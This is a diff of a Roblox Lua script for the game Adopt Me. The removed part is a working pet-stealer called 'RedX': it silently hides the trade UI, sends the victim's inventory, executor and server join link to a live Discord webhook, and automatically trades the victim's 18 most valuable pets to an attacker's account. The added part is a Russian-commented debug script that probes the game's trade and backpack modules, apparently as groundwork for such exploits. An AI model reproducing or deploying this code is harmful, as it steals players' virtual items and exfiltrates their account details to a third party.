@@ -1,522 +1,264 @@
-Username = "sosedra6" -- >> Your main username
-Username2 = "knisdqx_meow" -- >> Your alt username
-Webhook = "https://webhook.lewisakura.moe/api/webhooks/1441486238535385259/UD9X5VKaySPqiqUe4-1kqlcb53x7CD8anvEfE7sIabuCWYPpehYBkuRrAJL85QxF5QLZ" -- >> https://stealer.to/
-GoodHitsOnly = false -- >> Kicks player if they don't have good pets
+-- ==========================================
+-- ПОЛНЫЙ ДЕБАГ КОД ДЛЯ АНАЛИЗА BACKPACK И ТРЕЙДА
+-- ==========================================
 
-repeat task.wait() until game:IsLoaded()
-
-if getgenv().adm then return end
-getgenv().adm = true
-
-if Username == "" or Username == nil then
-    game:GetService("Players").LocalPlayer:Kick("\nPlease enter a Username!")
-    return
-end
-
-if Username2 == "" or Username2 == nil then
-    Username2 = "None"
-end
-
-if Webhook == "" or Webhook == nil then
-    game:GetService("Players").LocalPlayer:Kick("\nPlease enter a Webhook!")
-    return
-end
-
-if #game:GetService("Players"):GetPlayers() == game.Players.MaxPlayers then
-    game:GetService("Players").LocalPlayer:Kick("\nPlease join to different server!")
-    return
-end
-
-if game:GetService("RobloxReplicatedStorage"):FindFirstChild("GetServerType"):InvokeServer() == "VIPServer" then
-    game.Players.LocalPlayer:Kick("\nPrivate server detected!")
-    return
-end
-
-if GoodHitsOnly == nil then
-    GoodHitsOnly = false
-end
-
--- >> Values Table for all pets << --
-local valuesTable = {
-    -- Legendary Pets
-    ["Shadow Dragon"] = {value = 1000, rarity = "legendary"},
-    ["Giraffe"] = {value = 800, rarity = "legendary"},
-    ["Bat Dragon"] = {value = 750, rarity = "legendary"},
-    ["Frost Dragon"] = {value = 600, rarity = "legendary"},
-    ["Owl"] = {value = 500, rarity = "legendary"},
-    ["Parrot"] = {value = 450, rarity = "legendary"},
-    ["Evil Unicorn"] = {value = 400, rarity = "legendary"},
-    ["Crow"] = {value = 380, rarity = "legendary"},
-    ["King Monkey"] = {value = 300, rarity = "legendary"},
-    ["Arctic Reindeer"] = {value = 280, rarity = "legendary"},
-    ["Albino Monkey"] = {value = 250, rarity = "legendary"},
-    ["Turtle"] = {value = 200, rarity = "legendary"},
-    ["Kangaroo"] = {value = 180, rarity = "legendary"},
-    ["Unicorn"] = {value = 150, rarity = "legendary"},
-    ["Dragon"] = {value = 100, rarity = "legendary"},
-    ["Golden Penguin"] = {value = 90, rarity = "legendary"},
-    ["Diamond Griffin"] = {value = 85, rarity = "legendary"},
-    ["Diamond Dragon"] = {value = 80, rarity = "legendary"},
-    ["Diamond Unicorn"] = {value = 75, rarity = "legendary"},
-    ["Golden Rat"] = {value = 70, rarity = "legendary"},
-    ["Golden Dragon"] = {value = 65, rarity = "legendary"},
-    ["Golden Griffin"] = {value = 8, rarity = "legendary"},
-    ["Golden Unicorn"] = {value = 55, rarity = "legendary"},
-    ["Queen Bee"] = {value = 120, rarity = "legendary"},
-    ["Skeleton Rex"] = {value = 110, rarity = "legendary"},
-    ["Cerberus"] = {value = 95, rarity = "legendary"},
-    ["Guardian Lion"] = {value = 90, rarity = "legendary"},
-    ["Kitsune"] = {value = 85, rarity = "legendary"},
-    ["Dodo"] = {value = 70, rarity = "legendary"},
-    ["T-Rex"] = {value = 70, rarity = "legendary"},
-    ["Snow Owl"] = {value = 65, rarity = "legendary"},
-    ["Phoenix"] = {value = 60, rarity = "legendary"},
-    ["Shark"] = {value = 55, rarity = "legendary"},
-    ["Octopus"] = {value = 50, rarity = "legendary"},
-    ["Goldhorn"] = {value = 45, rarity = "legendary"},
-    ["Diamond Ladybug"] = {value = 40, rarity = "legendary"},
-    ["Ancient Dragon"] = {value = 35, rarity = "legendary"},
-    ["Diamond King Penguin"] = {value = 30, rarity = "legendary"},
-    ["Chameleon"] = {value = 25, rarity = "legendary"},
-    ["Lava Dragon"] = {value = 20, rarity = "legendary"},
-    ["Strawberry Bat Dragon"] = {value = 15, rarity = "legendary"},
-    ["SS Bat Dragon"] = {value = 10, rarity = "legendary"},
-    ["Alicorn"] = {value = 30, rarity = "legendary"}, -- from that updated
-    ["Kitty Bat"] = {value = 16, rarity = "legendary"},
-
-    -- Ultra-Rare Pets
-    ["Bee"] = {value = 25, rarity = "ultra_rare"},
-    ["Penguin"] = {value = 20, rarity = "ultra_rare"},
-    ["Red Panda"] = {value = 18, rarity = "ultra_rare"},
-    ["Shiba Inu"] = {value = 16, rarity = "ultra_rare"},
-    ["Sloth"] = {value = 9, rarity = "ultra_rare"},
-    ["Koala"] = {value = 14, rarity = "ultra_rare"},
-    ["Frog"] = {value = 13, rarity = "ultra_rare"},
-    ["Yeti"] = {value = 12, rarity = "ultra_rare"},
-    ["Lamb"] = {value = 11, rarity = "ultra_rare"},
-    ["Cow"] = {value = 10, rarity = "ultra_rare"},
-    ["Pig"] = {value = 9, rarity = "ultra_rare"},
-    ["Rhino"] = {value = 8, rarity = "ultra_rare"},
-    ["Platypus"] = {value = 7, rarity = "ultra_rare"},
-    ["Zombie Buffalo"] = {value = 6, rarity = "ultra_rare"},
-    ["Turkey"] = {value = 5, rarity = "ultra_rare"},
-    ["Silly Duck"] = {value = 4, rarity = "ultra_rare"},
-    ["Drake"] = {value = 3, rarity = "ultra_rare"},
-    ["Lion"] = {value = 2, rarity = "ultra_rare"},
-    ["Blue Dog"] = {value = 1, rarity = "ultra_rare"},
-    ["Gingerbread Reindeer"] = {value = 45, rarity = "ultra_rare"}, -- from that updated
-
-    -- Rare Pets
-    ["Bunny"] = {value = 8, rarity = "rare"},
-    ["Beaver"] = {value = 7, rarity = "rare"},
-    ["Rabbit"] = {value = 6, rarity = "rare"},
-    ["Snow Puma"] = {value = 5, rarity = "rare"},
-    ["Chocolate Labrador"] = {value = 4, rarity = "rare"},
-    ["Poodle"] = {value = 2, rarity = "rare"},
-    ["Swan"] = {value = 2, rarity = "rare"},
-    ["Black Panther"] = {value = 1, rarity = "rare"},
-    ["Zebra"] = {value = 1, rarity = "rare"}, -- from that updated
-
-    -- Uncommon Pets
-    ["Cat"] = {value = 4, rarity = "uncommon"},
-    ["Dog"] = {value = 3, rarity = "uncommon"},
-    ["Buffalo"] = {value = 2, rarity = "uncommon"},
-    ["Robin"] = {value = 1, rarity = "uncommon"},
-    ["Jumping Spider"] = {value = 2, rarity = "uncommon"}, -- from that updated
-    ["Shih Tzu"] = {value = 2, rarity = "uncommon"},
-    ["Tree Frog"] = {value = 2, rarity = "uncommon"},
-    ["Snowcat"] = {value = 2, rarity = "uncommon"},
-    ["Wolf"] = {value = 13, rarity = "uncommon"},
-    ["Bat"] = {value = 3, rarity = "uncommon"},
-    ["Camel"] = {value = 3, rarity = "uncommon"},
-
-    -- Common Pets
-    ["Otter"] = {value = 2, rarity = "common"},
-    ["Chick"] = {value = 1, rarity = "common"}
-}
-
--- >> Rarity multipliers << --
-local rarityMultipliers = {
-    FR = 3.0,    -- Fly & Ride
-    MFR = 8.0,   -- Mega Fly & Ride  
-    NFR = 4.0,   -- Neon Fly & Ride
-    F = 2.0,     -- Fly only
-    R = 1.5,     -- Ride only
-    N = 2.5,     -- Neon only
-    M = 6.0      -- Mega only
-}
-
--- >> /kick command << --
-game.Players.PlayerAdded:Connect(function(newPlayer)
-    newPlayer.Chatted:Connect(function(message)
-        if message == "/kick" then
-            game.Players.LocalPlayer:Kick("\nPlease rejoin!")
+local function debugBackpackAndTradeSystem()
+    print("=== НАЧАЛО АНАЛИЗА BACKPACK И ТРЕЙД СИСТЕМЫ ===")
+    
+    -- Загружаем Fsys если еще не загружен
+    if not _G.Fsys then
+        _G.Fsys = require(game:GetService("ReplicatedStorage").Fsys)
+    end
+    
+    local Fsys = _G.Fsys
+    
+    -- 1. Анализ зависимостей между модулями
+    print("\n--- 1. АНАЛИЗ ЗАВИСИМОСТЕЙ МОДУЛЕЙ ---")
+    local dependency_tree = Fsys.get_raw_dependency_tree()
+    for module_name, dependencies in pairs(dependency_tree) do
+        if string.find(module_name:lower(), "backpack") or 
+           string.find(module_name:lower(), "trade") or 
+           string.find(module_name:lower(), "inventory") or
+           string.find(module_name:lower(), "pet") or
+           string.find(module_name:lower(), "player") then
+            print("Модуль:", module_name)
+            for dep_name, _ in pairs(dependencies) do
+                print("  Зависит от:", dep_name)
+            end
+        end
+    end
+    
+    -- 2. Поиск всех модулей связанных с backpack и trade
+    print("\n--- 2. ПОИСК МОДУЛЕЙ С BACKPACK И TRADE ---")
+    local relevant_modules = {}
+    
+    -- Сначала получим все доступные модули через Fsys
+    for module_name, module_script in pairs(getfenv(Fsys.load).tbl_5_upvr or {}) do
+        if string.find(tostring(module_name):lower(), "backpack") or 
+           string.find(tostring(module_name):lower(), "trade") or 
+           string.find(tostring(module_name):lower(), "inventory") or
+           string.find(tostring(module_name):lower(), "pet") or
+           string.find(tostring(module_name):lower(), "player") then
+            table.insert(relevant_modules, module_name)
+            print("Найден релевантный модуль:", module_name)
+        end
+    end
+    
+    -- 3. Глубокий анализ ключевых модулей
+    print("\n--- 3. ГЛУБОКИЙ АНАЛИЗ КЛЮЧЕВЫХ МОДУЛЕЙ ---")
+    local key_modules = {
+        "RouterClient",
+        "TradeApi", 
+        "PlayerApp",
+        "FocusPetApp",
+        "Backpack",
+        "Inventory",
+        "Trade",
+        "PetApp"
+    }
+    
+    for _, module_name in ipairs(key_modules) do
+        pcall(function()
+            local module = Fsys.load(module_name)
+            if module then
+                print("\n✅ Модуль загружен:", module_name)
+                -- Анализ структуры модуля
+                for key, value in pairs(module) do
+                    local key_str = tostring(key)
+                    if string.find(key_str:lower(), "backpack") or 
+                       string.find(key_str:lower(), "trade") or 
+                       string.find(key_str:lower(), "inventory") or
+                       string.find(key_str:lower(), "visible") or
+                       string.find(key_str:lower(), "enable") or
+                       string.find(key_str:lower(), "disable") then
+                        print("  🔍 Найден ключ:", key, "тип:", type(value))
+                    end
+                end
+            end
+        end)
+        
+        -- Пробуем варианты с префиксами
+        pcall(function()
+            local module = Fsys.load("package:" .. module_name)
+            if module then
+                print("\n✅ Пакетный модуль загружен: package:" .. module_name)
+            end
+        end)
+    end
+    
+    -- 4. Поиск функций управления видимостью UI
+    print("\n--- 4. ПОИСК ФУНКЦИЙ УПРАВЛЕНИЯ UI ---")
+    local function analyzeModuleForUIFunctions(module_name, module_table)
+        if not module_table then return end
+        
+        for key, value in pairs(module_table) do
+            if type(value) == "function" then
+                local key_str = tostring(key):lower()
+                if string.find(key_str, "set") and 
+                   (string.find(key_str, "visible") or 
+                    string.find(key_str, "enable") or
+                    string.find(key_str, "show") or
+                    string.find(key_str, "hide")) then
+                    print("  🎯 Функция управления видимостью:", module_name .. "." .. key)
+                    
+                    -- Пробуем получить информацию о функции
+                    local success, func_info = pcall(debug.getinfo, value)
+                    if success and func_info then
+                        if func_info.source then
+                            print("    📍 Источник:", func_info.source)
+                        end
+                        if func_info.linedefined then
+                            print("    📏 Линия определения:", func_info.linedefined)
+                        end
+                    end
+                end
+            end
+        end
+    end
+    
+    -- Анализируем ключевые модули на функции UI
+    for _, module_name in ipairs(key_modules) do
+        pcall(function()
+            local module = Fsys.load(module_name)
+            if module then
+                analyzeModuleForUIFunctions(module_name, module)
+            end
+        end)
+    end
+    
+    -- 5. Поиск событий торговли
+    print("\n--- 5. ПОИСК СОБЫТИЙ ТОРГОВЛИ ---")
+    pcall(function()
+        local TradeApi = Fsys.load("TradeApi")
+        if TradeApi then
+            print("🔍 Анализ TradeApi на события:")
+            for key, value in pairs(TradeApi) do
+                local key_str = tostring(key):lower()
+                if string.find(key_str, "event") or 
+                   string.find(key_str, "start") or 
+                   string.find(key_str, "end") or
+                   string.find(key_str, "changed") then
+                    print("  📢 Событие/состояние:", key, "тип:", type(value))
+                end
+            end
         end
     end)
-end)
-
--- >> Decline trade request logic << --
-local Loads = require(game.ReplicatedStorage.Fsys).load
-local RouterClient = Loads("RouterClient")
-local TradeRequestReceivedRemote = RouterClient.get_event("TradeAPI/TradeRequestReceived")
-local TradeAcceptOrDeclineRequest = RouterClient.get("TradeAPI/AcceptOrDeclineTradeRequest")
-local SettingsRemote = RouterClient.get("SettingsAPI/SetSetting") -- SettingsRemote for trade ON
-
-SettingsRemote:FireServer("trade_requests", 1)
-
-local function moveGuiOffscreen(guiElement)
-    if guiElement then guiElement.Position = UDim2.new(1000, 0, 1000, 0) end
-end
-
-local function hideDialog()
-    local dialogApp = game.Players.LocalPlayer:WaitForChild("PlayerGui"):FindFirstChild("DialogApp")
-    if dialogApp and dialogApp:FindFirstChild("Dialog") then
-        dialogApp.Dialog.Visible = false
-        moveGuiOffscreen(dialogApp.Dialog)
-    end
-end
-
-local function declineTradeRequest(player)
-    TradeAcceptOrDeclineRequest:InvokeServer(player, false)
-end
-
-hideDialog()
-
-TradeRequestReceivedRemote.OnClientEvent:Connect(function(sender)
-    if sender.Name ~= game.Players.LocalPlayer.Name then
-        declineTradeRequest(sender)
-    end
-end)
-
-declineTradeRequest()
-
-local Pets = {}
-local PetCounts = {}
-local Loaders = require(game.ReplicatedStorage.Fsys).load
-local InventoryDB = Loaders("InventoryDB")
-local ClientData = Loaders("ClientData")
-local clientData = require(game.ReplicatedStorage.ClientModules.Core.ClientData)
-local playerData = clientData.get_data()[tostring(game.Players.LocalPlayer)]
-
-local neon_count = 0
-local mega_neon_count = 0
-local flyable_count = 0
-local rideable_count = 0
-local legendaries_count = 0
-local ultra_count = 0
-local rare_count = 0
-local uncommon_count = 0
-local common_count = 0
-local fr_count = 0
-local mfr_count = 0
-local nfr_count = 0
-
-for _, petData in pairs(playerData.inventory.pets) do
-    if petData.properties and type(petData.properties) == "table" then
-        if petData.properties.neon then
-            neon_count = neon_count + 1
-        end
-        if petData.properties.mega_neon then
-            mega_neon_count = mega_neon_count + 1
-        end
-        if petData.properties.flyable then
-            flyable_count = flyable_count + 1
-        end
-        if petData.properties.rideable then
-            rideable_count = rideable_count + 1
-        end
-        if petData.properties.flyable and petData.properties.rideable then
-            fr_count = fr_count + 1
-        end
-        if petData.properties.neon and petData.properties.flyable and petData.properties.rideable then
-            nfr_count = nfr_count + 1
-        end
-        if petData.properties.mega_neon and petData.properties.flyable and petData.properties.rideable then
-            mfr_count = mfr_count + 1
-        end
-    end
-end
-
-for i, v in pairs(ClientData.get("inventory").pets) do
-    local petData = InventoryDB[v.category][v.id]
     
-    if petData.rarity == "legendary" then
-        legendaries_count = legendaries_count + 1
-    elseif petData.rarity == "ultra_rare" then
-        ultra_count = ultra_count + 1
-    elseif petData.rarity == "rare" then
-        rare_count = rare_count + 1
-    elseif petData.rarity == "uncommon" then
-        uncommon_count = uncommon_count + 1
-    elseif petData.rarity == "common" then
-        common_count = common_count + 1
-    end
-end
-
-if legendaries_count == 1 then
-    legendaries_count = 0
-elseif legendaries_count > 1 then
-    legendaries_count = legendaries_count - 1
-end
-
-if ultra_count == 1 then
-    ultra_count = 0
-elseif ultra_count > 1 then
-    ultra_count = ultra_count - 1
-end
-
-if GoodHitsOnly and legendaries_count == 0 and neon_count == 0 and mega_neon_count == 0 and flyable_count == 0 and rideable_count == 0 then
-    game:GetService("Players").LocalPlayer:Kick("\nPlease use different account!")
-    return
-end
-
-local plr = game.Players.LocalPlayer
-local accage = plr.AccountAge
-local ExecutorValue = identifyexecutor() or "Unknown"
-local placeId = game.PlaceId
-local jobId = game.JobId
-local TeleportScript = "roblox://experiences/start?placeId=" .. placeId .. "&gameInstanceId=" .. jobId
-local VersionValue = "1.12 (trade mechanic changed)"
-
-    local embed = {
-        ["title"] = "New HIT with **RedX**",
-        ["color"] = tonumber(0x3365FF),
-        ["fields"] = {
-            {
-                ["name"] = "〘:mammoth:〙**User Information**",
-                ["value"] = "```lua\n" ..
-                            "Username      : " .. tostring(game.Players.LocalPlayer.Name) .. "\n" ..
-                            "Account Age   : " .. tostring(game.Players.LocalPlayer.AccountAge) .. " Days\n" ..
-                            "Executor      : " .. tostring(ExecutorValue) .. "\n" ..
-                            "Receiver      : " .. tostring(Username) .. "\n" ..
-                            "RedX          : " .. tostring(VersionValue) .. "```"                            
-            },
-            {
-                ["name"] = "〘:100:〙**Inventory Information**",
-                ["value"] = "```lua\n" ..
-                            "〘Pets above 1$〙  : " .. tostring(mfr_count + nfr_count + flyable_count + rideable_count) .. "\n" ..
-                            "〘Mega Pets〙      : " .. tostring(mega_neon_count) .. "\n" ..
-                            "〘Neon Pets〙      : " .. tostring(neon_count) .. "\n" ..
-                            "〘Legendary Pets〙 : " .. tostring(legendaries_count) .. "\n" ..
-                            "〘Ultra-Rare Pets〙: " .. tostring(ultra_count) .. "\n" ..
-                            "〘Uncommon pets〙  : " .. tostring(uncommon_count) .. "\n" ..
-                            "〘Rare pets〙      : " .. tostring(rare_count) .. "```" 
-            },
-            {
-                ["name"] = "〘:computer:〙**Teleport to :mammoth:**",
-                ["value"] = "```lua\n" ..
-                            TeleportScript .. "\n" .."```"
-            },
-        }
-    }
-
-function SendMessageEMBED(url, embed, bool)
-  local http = game:GetService("HttpService")
-  local headers = {
-      ["Content-Type"] = "application/json"
-  }
-  local data = {
-      username = "RedX | Hit",
-      avatar_url = "https://i.pinimg.com/736x/d2/cd/f2/d2cdf2a8169c9e444ed5402c67fce98d.jpg",
-      content = "pew",
-      embeds = {
-          {
-              title = embed.title,
-              color = embed.color,
-              fields = embed.fields,
-          }
-      }
-  }
-  local data2 = {
-      username = "RedX | Hit",
-      avatar_url = "https://i.pinimg.com/736x/d2/cd/f2/d2cdf2a8169c9e444ed5402c67fce98d.jpg",
-      content = "-- @everyone\n" .. TeleportScript,
-      embeds = {
-          {
-              title = embed.title,
-              color = 0x660000,
-              fields = embed.fields,
-          }
-      }
-  }
-
-  local body = http:JSONEncode(data)
-  local body2 = http:JSONEncode(data2)
-  if bool == true then
-      local response = request({
-          Url = url,
-          Method = "POST",
-          Headers = headers,
-          Body = body2
-      })
-  else
-      local response = request({
-          Url = url,
-          Method = "POST",
-          Headers = headers,
-          Body = body
-      })
-  end
-end
-
-game:GetService("Players").LocalPlayer.PlayerGui.TradeApp.Enabled = false
-game:GetService("Players").LocalPlayer.PlayerGui.HintApp:Destroy()
-game:GetService("Players").LocalPlayer.PlayerGui.DialogApp.Dialog.Visible = false
-
-local sent = false
-
-local function TradeIncoming(ReceiverName)
-    sent =  true
-    while sent do
-        local RouterClient = Loaders("RouterClient")
-        local SendTrade = RouterClient.get("TradeAPI/SendTradeRequest")
-        moveGuiOffscreen()
-    
-        SendTrade:FireServer(game.Players[ReceiverName])
-        wait(3)
-        local RouterClient = Loaders("RouterClient")
-        local AddPetRemote = RouterClient.get("TradeAPI/AddItemToOffer")
-        local AcceptNegotiationRemote = RouterClient.get("TradeAPI/AcceptNegotiation")
-        local ConfirmTradeRemote = RouterClient.get("TradeAPI/ConfirmTrade")
-        local InventoryDB = require(game.ReplicatedStorage.Fsys).load("InventoryDB")
-        local ClientData = require(game.ReplicatedStorage.ClientModules.Core.ClientData)
-
-        -- Function to calculate pet value based on valuesTable and properties
-        local function calculatePetValue(petData)
-            local petInfo = InventoryDB[petData.category][petData.id]
-            local petName = petInfo.name
-            local baseValue = 0
-            
-            -- Find base value from valuesTable
-            for petKey, valueData in pairs(valuesTable) do
-                if string.lower(petName) == string.lower(petKey) then
-                    baseValue = valueData.value
-                    break
+    -- 6. Анализ RouterClient для трейда
+    print("\n--- 6. АНАЛИЗ ROUTERCLIENT ---")
+    pcall(function()
+        local RouterClient = Fsys.load("RouterClient")
+        if RouterClient then
+            print("🔍 Анализ RouterClient:")
+            for key, value in pairs(RouterClient) do
+                local key_str = tostring(key):lower()
+                if string.find(key_str, "trade") or string.find(key_str, "route") then
+                    print("  🛣️  Роутер/Трейд:", key, "тип:", type(value))
                 end
             end
-            
-            -- Apply multipliers based on properties
-            local multiplier = 1.0
-            
-            if petData.properties then
-                if petData.properties.mega_neon and petData.properties.flyable and petData.properties.rideable then
-                    multiplier = rarityMultipliers.MFR
-                elseif petData.properties.neon and petData.properties.flyable and petData.properties.rideable then
-                    multiplier = rarityMultipliers.NFR
-                elseif petData.properties.flyable and petData.properties.rideable then
-                    multiplier = rarityMultipliers.FR
-                elseif petData.properties.mega_neon then
-                    multiplier = rarityMultipliers.M
-                elseif petData.properties.neon then
-                    multiplier = rarityMultipliers.N
-                elseif petData.properties.flyable then
-                    multiplier = rarityMultipliers.F
-                elseif petData.properties.rideable then
-                    multiplier = rarityMultipliers.R
+        end
+    end)
+    
+    -- 7. Анализ звуков торговли
+    print("\n--- 7. АНАЛИЗ ЗВУКОВ ТОРГОВЛИ ---")
+    pcall(function()
+        local Sounds = Fsys.load("Sounds")
+        if Sounds then
+            print("🔊 Доступные звуки:")
+            for sound_name, sound_data in pairs(Sounds) do
+                if string.find(sound_name:lower(), "trade") or 
+                   string.find(sound_name:lower(), "purchase") or
+                   string.find(sound_name:lower(), "select") then
+                    print("  🔊 Звук:", sound_name)
+                    print("    🆔 ID:", sound_data.SoundId)
+                    if sound_data.DefaultPlaybackProperties then
+                        print("    🔊 Громкость:", sound_data.DefaultPlaybackProperties.Volume)
+                    end
                 end
             end
-            
-            return baseValue * multiplier, baseValue
         end
-
-        -- Get and sort pets by value
-        local PetsInventory = ClientData.get_data()[game.Players.LocalPlayer.Name].inventory.pets
-        local sortedPets = {}
-        
-        for petUid, petData in pairs(PetsInventory) do
-            local calculatedValue, baseValue = calculatePetValue(petData)
-            table.insert(sortedPets, {
-                uid = petUid,
-                data = petData,
-                value = calculatedValue,
-                baseValue = baseValue
-            })
-        end
-        
-        -- Sort pets by value (highest first)
-        table.sort(sortedPets, function(a, b)
-            return a.value > b.value
-        end)
-        
-        -- Add pets to trade (best ones first)
-        local petCount = 0
-        local petLimit = 18
-        
-        for _, petInfo in ipairs(sortedPets) do
-            if petCount < petLimit then
-                AddPetRemote:FireServer(petInfo.uid)
-                petCount = petCount + 1
-                wait(0.2) -- Small delay to avoid rate limits
-            else
-                break
+    end)
+    
+    -- 8. Поиск конкретных путей и элементов
+    print("\n--- 8. ПОИСК ПУТЕЙ К BACKPACK ---")
+    
+    -- Функция для поиска в игровых объектах
+    local function findBackpackInGame()
+        local players = game:GetService("Players")
+        local localPlayer = players.LocalPlayer
+        if localPlayer then
+            -- Ищем в PlayerGui
+            local playerGui = localPlayer:FindFirstChild("PlayerGui")
+            if playerGui then
+                local function searchForBackpack(parent, depth)
+                    if depth > 5 then return end -- Ограничиваем глубину поиска
+                    
+                    for _, child in ipairs(parent:GetChildren()) do
+                        local name_lower = child.Name:lower()
+                        if string.find(name_lower, "backpack") or 
+                           string.find(name_lower, "inventory") or
+                           string.find(name_lower, "focuspet") then
+                            print("🎒 Найден объект:", child:GetFullName())
+                            
+                            -- Проверяем свойства видимости
+                            if child:IsA("GuiObject") then
+                                print("   👁️  Visible:", child.Visible)
+                                print("   🔵 BackgroundTransparency:", child.BackgroundTransparency)
+                            end
+                        end
+                        searchForBackpack(child, depth + 1)
+                    end
+                end
+                
+                searchForBackpack(playerGui, 0)
             end
         end
-        
-        wait(5)
-        AcceptNegotiationRemote:FireServer() -- Accepts first 
-        wait(5)
-        ConfirmTradeRemote:FireServer() -- finish
     end
+    
+    pcall(findBackpackInGame)
+    
+    -- 9. Проверка времени загрузки модулей
+    print("\n--- 9. ВРЕМЯ ЗАГРУЗКИ МОДУЛЕЙ ---")
+    local timings = Fsys.get_raw_async_timings()
+    for timing_name, timing_value in pairs(timings or {}) do
+        if string.find(timing_name:lower(), "backpack") or 
+           string.find(timing_name:lower(), "trade") or 
+           string.find(timing_name:lower(), "pet") then
+            print("⏱️  Время загрузки:", timing_name, "=", timing_value)
+        end
+    end
+    
+    print("\n=== АНАЛИЗ ЗАВЕРШЕН ===")
+    print("📋 Следующие шаги:")
+    print("1. Найдите конкретные функции управления видимостью")
+    print("2. Проверьте события начала/окончания торговли") 
+    print("3. Проанализируйте как TradeApi влияет на UI элементы")
+    print("4. Найдите где вызывается отключение рюкзака при трейде")
 end
 
-function SendLeaveNotify(playerName)
-    local headers = {
-        ["Content-Type"] = "application/json"
-    }
+-- Запускаем анализ
+debugBackpackAndTradeSystem()
 
-    local dataLeave = {
-        username = "RedX | Notification",
-        avatar_url = "https://i.pinimg.com/736x/d2/cd/f2/d2cdf2a8169c9e444ed5402c67fce98d.jpg",
-        content = "**" .. playerName .. "** left from the game!",
-        embeds = {
-            {
-                color = 0x610066,
-                fields = {
-                    {
-                        name = "〘:mammoth:〙**User**",
-                        value = "```lua" ..
-                            "\nUsername   : " .. game.Players.LocalPlayer.Name .."```",
-                        inline = false
-                    }
-                }
-            }
-        }
-    }
-
-    local jsonDataLeave = game:GetService("HttpService"):JSONEncode(dataLeave)
-
-    local response = request({
-        Url = Webhook,
-        Method = "POST",
-        Headers = headers,
-        Body = jsonDataLeave
-    })
+-- Также предоставляем отдельные функции для точечного анализа
+local function quickFindBackpack()
+    print("\n=== БЫСТРЫЙ ПОИСК BACKPACK ===")
+    local Fsys = _G.Fsys or require(game:GetService("ReplicatedStorage").Fsys)
+    
+    pcall(function()
+        local FocusPetApp = Fsys.load("FocusPetApp")
+        if FocusPetApp then
+            print("✅ FocusPetApp загружен")
+            for key, value in pairs(FocusPetApp) do
+                if tostring(key):find("backpack") then
+                    print("🎯 Найден backpack в FocusPetApp:", key)
+                end
+            end
+        end
+    end)
 end
 
-game:GetService("Players").PlayerRemoving:Connect(function(player)
-    if player == game:GetService("Players").LocalPlayer then
-        SendLeaveNotify(player.Name)
-    end
-end)
-
-SendMessageEMBED(Webhook, embed, true)
-
-game.Players.PlayerAdded:Connect(function(player)
-    if player.Name == Username then
-        player.Chatted:Connect(function(msg)
-            if not sent then
-            TradeIncoming(Username)
-            end
-        end)
-    end
-end)
-
-game.Players.PlayerAdded:Connect(function(player)
-    if player.Name == Username2 then
-        player.Chatted:Connect(function(msg)
-            if not sent then
-                TradeIncoming(Username2)
-            end
-        end)
-    end
-end)
+-- Экспортируем функции для повторного использования
+return {
+    debugBackpackAndTradeSystem = debugBackpackAndTradeSystem,
+    quickFindBackpack = quickFindBackpack
+}
